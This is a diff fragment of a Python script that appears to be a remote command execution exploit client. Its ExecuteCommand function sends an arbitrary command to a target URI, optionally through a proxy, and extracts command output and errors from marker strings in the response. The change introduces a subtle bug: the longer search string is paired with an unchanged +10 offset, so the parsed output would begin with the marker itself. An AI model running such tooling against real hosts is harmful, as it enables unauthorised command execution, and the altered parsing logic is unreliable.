@@ -52,12 +52,11 @@ def BuildRequest(command):
 def ExecuteCommand(command):
     payload = BuildRequest(command)
     uri = TARGET + URI
-    result = ""
     if PROXY is None:
         result = requests.post(uri, payload, timeout=5).text.strip()
     else:
         result = requests.post(uri, payload, timeout=5, proxies={'http': PROXY}).text.strip()
-    start = result.find('#STARTOUT#') + 10
+    start = result.find('</h2><pre>#STARTOUT#') + 10
     end = result.find('#ENDOUT#', start)
     starterr = result.find('#STARTERR#', end) + 10
     enderr = result.find('#ENDERR#', starterr)
